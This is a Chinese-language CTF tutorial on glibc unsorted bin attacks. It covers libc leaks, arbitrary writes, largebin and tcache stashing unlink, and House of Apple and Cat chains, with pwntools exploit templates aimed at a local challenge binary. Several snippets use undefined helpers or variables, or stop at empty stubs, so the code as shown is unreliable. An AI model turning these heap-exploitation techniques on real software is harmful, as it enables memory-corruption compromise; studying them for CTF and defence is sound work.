# Unsorted Bin 攻击

## 原理

glibc 的 unsorted bin 是一个临时存放 free chunk 的双向链表。攻击者通过 UAF 修改 unsorted bin 中 chunk 的 fd/bk 指针，实现任意地址写或信息泄露。

## Unsorted Bin 特点

- 双向链表（fd/bk）
- FIFO（先进先出）
- chunk 大小任意
- 链表头在 main_arena 中
- free 的 chunk 先进入 unsorted bin（非 fastbin/tcache 大小）

## 攻击链

### 1. 泄露 libc 地址

```python
from pwn import *

p = process('./pwn')

# 1. 分配大 chunk（大于 tcache）
malloc(0x400)  # idx 0
malloc(0x20)   # idx 1，防止合并
# 2. 释放 idx 0，进入 unsorted bin
free(0)
# 3. UAF 读取 fd/bk
fd = u64(read(0, 8))
bk = u64(read(0, 8, offset=8))
# fd/bk 指向 main_arena + 96（64位）
libc_base = fd - (libc.symbols['main_arena'] + 96)
```

### 2. Unsorted Bin Attack（任意地址写大值）

```python
# 1. 分配大 chunk
malloc(0x400)  # idx 0
malloc(0x20)   # idx 1
# 2. 释放 idx 0
free(0)
# 3. UAF 修改 bk
edit(0, p64(0) + p64(target_addr - 0x10))
# 4. 分配触发
malloc(0x400)
# target_addr 处被写入 main_arena 地址（一个很大的值）
```

### 3. Large Bin Attack

```python
# 1. 分配大 chunk
malloc(0x420)  # idx 0
malloc(0x20)   # idx 1
malloc(0x410)  # idx 2
malloc(0x20)   # idx 3
# 2. 释放 idx 0
free(0)
# 3. 分配大 chunk，触发 idx 0 进入 largebin
malloc(0x430)  # idx 4
# 4. 释放 idx 2
free(2)
# 5. UAF 修改 idx 0 的 fd_nextsize/bk_nextsize
edit(0, p64(0) + p64(0) + p64(0) + p64(target_addr - 0x20))
# 6. 分配触发
malloc(0x430)
# target_addr 处被写入堆地址
```

### 4. Unsorted Bin -> Smallbin

```python
# 当 unsorted bin 中的 chunk 被请求时
# 如果大小不匹配，会被放入对应的 smallbin/largebin
# 利用这个机制可以实现 tcache stashing unlink attack
```

### 5. Tcache Stashing Unlink Attack

```python
# 利用 tcache 和 smallbin 的交互
# 当 smallbin 中的 chunk 被分配时，剩余 chunk 会被放入 tcache

# 1. 填满 tcache
for i in range(7):
    malloc(0x90)  # idx 0-6
malloc(0x90)  # idx 7
malloc(0x20)  # idx 8，防止合并
# 2. 释放 7 个填满 tcache
for i in range(7):
    free(i)
# 3. 释放 idx 7，进入 unsorted bin
free(7)
# 4. 分配大 chunk，触发 idx 7 进入 smallbin
malloc(0x100)  # idx 9
# 5. 分配 7 个清空 tcache
for i in range(7):
    malloc(0x90)
# 6. 修改 smallbin 中 chunk 的 bk
edit(7, p64(0) + p64(target_addr - 0x10))
# 7. 分配 0x90，触发 tcache stashing unlink
# target_addr 处的 chunk 被放入 tcache
malloc(0x90)
```

## 利用场景

### 1. 覆盖 global_max_fast

```python
# unsorted bin attack 覆盖 global_max_fast
# 让大 chunk 也进入 fastbin
target = libc.symbols['global_max_fast']
# unsorted bin attack
# target 处被写入 main_arena 地址（很大值）
# 之后 free 大 chunk 也会进入 fastbin
```

### 2. 覆盖 _IO_list_all

```python
# unsorted bin attack 覆盖 _IO_list_all
# 实现 IO_FILE 攻击（House of Orange）
target = libc.symbols['_IO_list_all']
# unsorted bin attack
# target 处被写入 main_arena 地址
# 然后构造 fake IO_FILE
```

### 3. 覆盖 __exit_funcs

```python
# glibc 2.34+
# 覆盖 __exit_funcs 实现 RCE
```

## 2024-2026 新技术点

### 1. glibc 2.34+ Unsorted Bin 加固

```python
# glibc 2.34+ 对 unsorted bin attack 的加强检查
# bk->fd == chunk 检查（双向链表一致性）

from pwn import *

context.arch = 'amd64'

def unsorted_bin_bypass_2_34():
    """glibc 2.34+ unsorted bin 利用"""
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    def show(idx):
        p.sendlineafter(b'>', b'4')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    # === glibc 2.34+ unsorted bin 检查 ===
    # 1. bk->fd == chunk（双向链表一致性）
    # 2. chunk->bk->fd == chunk（反向一致性）
    # 3. size 在合法范围内
    
    # 绕过方法 1：满足一致性检查
    # 修改 bk 时，确保 target-0x10 处的 fd 指向 chunk
    # 需要对 target 有两次写入能力
    malloc(0x400)  # idx 0
    malloc(0x20)   # idx 1
    free(0)
    show(0)
    fd = u64(p.recv(6).ljust(8, b'\x00'))
    libc_base = fd - (libc.symbols['main_arena'] + 96)
    
    # 修改 bk（需要同时修改 target-0x10 处的 fd）
    target = libc_base + libc.symbols['_IO_list_all']
    # 先写 target-0x10 处的 fd = chunk0_addr
    edit(target_fake_chunk_idx, p64(fd))  # 使 bk->fd == chunk
    # 再修改 unsorted bin 的 bk
    edit(0, p64(0) + p64(target - 0x10))
    
    # 绕过方法 2：利用 largebin attack 替代
    # largebin attack 的检查相对宽松
    # 可以将 unsorted bin attack 替换为 largebin attack
    
    # 绕过方法 3：tcache stashing unlink
    # 利用 smallbin -> tcache 的过程
    # 不经过 unsorted bin attack 的检查
    pass
```

### 2. House of Apple 系列 (Unsorted Bin 部分)

```python
# unsorted bin 在 House of Apple 中的角色

from pwn import *

context.arch = 'amd64'

def unsorted_bin_house_of_apple2():
    """
    Unsorted bin 在 House of Apple 2 中的作用：
    1. unsorted bin 泄露 libc 地址
    2. unsorted bin attack 可用于设置初始条件
    3. 但 glibc 2.34+ 中 unsorted bin attack 检查更严
    4. 更多依赖 largebin attack / tcache poisoning
    
    典型利用流程：
    1. 分配 0x400 chunk，释放到 unsorted bin
    2. 读取 fd/bk 泄露 libc
    3. 通过其他方式修改 _IO_list_all
    4. 构造 fake IO_FILE
    5. 触发 _IO_flush_all_lockp
    """
    pass
```

### 3. House of Cat (Unsorted Bin 部分)

```python
# unsorted bin 在 House of Cat 中的角色

from pwn import *

context.arch = 'amd64'

def unsorted_bin_house_of_cat():
    """
    House of Cat 利用链中 unsorted bin 的作用：
    1. unsorted bin 用于泄露 libc
    2. largebin attack 用于修改 _IO_list_all
    3. unsorted bin attack 在 glibc 2.35+ 中被替换
    4. 更多依赖 largebin 和 tcache
    
    glibc 2.35+ 的变化：
    - unsorted bin attack 检查加强
    - largebin attack 仍有利用空间
    - tcache poisoning 仍是主要分配原语
    """
    pass
```

### 4. Largebin Attack 新变种

```python
# glibc 2.34+ largebin attack 的新变种和绕过

from pwn import *

context.arch = 'amd64'

def new_largebin_attack_variants():
    """glibc 2.34+ largebin attack 新变种"""
    
    # === 变种 1：largebin attack + __IO_list_all ===
    # 利用 largebin 的 bk_nextsize 覆盖 _IO_list_all
    # 与传统 unsorted bin attack 类似但检查不同
    
    # === 变种 2：largebin attack + tls_dtor_list ===
    # 覆盖 TLS 中的 dtor_list
    # __cxa_thread_atexit_impl 使用此列表
    
    # === 变种 3：largebin attack + arena_push ===
    # 利用 largebin 操作中的 arena 推送
    
    # === glibc 2.34+ largebin 检查 ===
    # 1. bk_nextsize->fd_nextsize == chunk
    # 2. chunk_size 在合法范围内
    # 3. 堆地址对齐检查
    
    # 绕过方法：满足检查条件
    # 需要对 target-0x20 处有控制能力
    pass

def largebin_attack_template():
    """largebin attack 完整模板"""
    p = process('./pwn')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    # Step 1: 分配进入 largebin 的 chunk
    malloc(0x420)  # idx 0
    malloc(0x20)   # idx 1
    malloc(0x410)  # idx 2
    malloc(0x20)   # idx 3
    free(0)        # 进入 unsorted bin
    malloc(0x430)  # idx 4 - 触发 idx 0 进入 largebin
    
    # Step 2: 释放 idx 2，触发 largebin 比较
    free(2)
    
    # Step 3: 修改 idx 0 的 bk_nextsize
    # target - 0x20 处需要有合法的 size
    target = 0x404000
    # edit(0, p64(0) + p64(0) + p64(0) + p64(target - 0x20))
    
    # Step 4: 再次分配大 chunk，触发 largebin insert
    malloc(0x430)
    # target 处被写入堆地址
```

### 5. 硬件级防护对 Unsorted Bin 的影响

```python
# Intel CET / ARM PAC+BTI / ARM MTE 对 unsorted bin 利用的影响

from pwn import *

def hardware_bypass_unsorted_bin():
    """硬件防护下 unsorted bin 利用的调整"""
    
    # === MTE ===
    # unsorted bin chunk 的 fd/bk 指针受 MTE 保护
    # 修改时需要 tag 匹配
    # 绕过：确保 tag 一致（同一 tag 池分配）
    
    # === CET Shadow Stack ===
    # unsorted bin attack 最终覆盖的数据
    # 如果是返回地址，会被影子栈检测
    # 绕过：覆盖非返回地址的数据
    
    # === PAC ===
    # unsorted bin 泄露的 libc 地址可能受 PAC 编码
    # 需要解码后才能使用
    # 绕过：利用 PAC oracle 或 partial overwrite
    pass
```

### 6. 沙箱环境 Unsorted Bin 利用

```python
# seccomp 限制下的 unsorted bin 利用

from pwn import *

context.arch = 'amd64'

def unsorted_bin_orw():
    """unsorted bin + ORW"""
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    # 1. unsorted bin 泄露 libc
    # 2. tcache/fastbin poisoning 获取任意写
    # 3. 覆盖 exit_funcs 构造 ORW ROP
    # 或
    # 3. 覆盖 _IO_list_all 构造 fake IO_FILE
    # 4. 在 fake IO_FILE 中嵌入 ORW shellcode
    # 5. 触发执行
    
    # unsorted bin + IO_FILE stdout 劫持
    # 通过 unsorted bin 泄露 libc 后
    # 利用 tcache poisoning 覆盖 _IO_2_1_stdout_
    # 设置 _IO_write_base 为低地址
    # 设置 _IO_write_ptr 为高地址
    # printf 输出任意内存 -> 泄露更多地址
    
    p.interactive()
```

## 工具推荐

- **pwntools** — Python 利用框架
- **gdb + pwndbg** — 动态调试（unsortedbin 命令）
- **heap-viewer** — 堆可视化

## 参考链接

- [ctf-wiki unsorted bin](https://ctf-wiki.org/pwn/linux/glibc-heap/unsorted_bin_attack/)
- [how2heap unsorted bin](https://github.com/shellphish/how2heap)
- [Unsorted Bin Attack](https://www.jianshu.com/p/4d7d7a460c0c)
